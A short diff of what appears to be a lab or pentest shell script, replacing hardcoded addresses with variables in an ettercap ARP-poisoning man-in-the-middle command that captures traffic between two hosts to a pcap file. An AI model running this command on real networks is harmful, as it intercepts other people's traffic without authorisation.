@@ -16,4 +16,4 @@
 TARGET1=123.100.10.1
 TARGET2=123.100.20.1
 
-ettercap -T -w mitm.pcap -i eth0 -M arp /123.100.10.1// /123.100.20.1//
+ettercap -T -w mitm.pcap -i eth0 -M arp /$TARGET1// /$TARGET2//
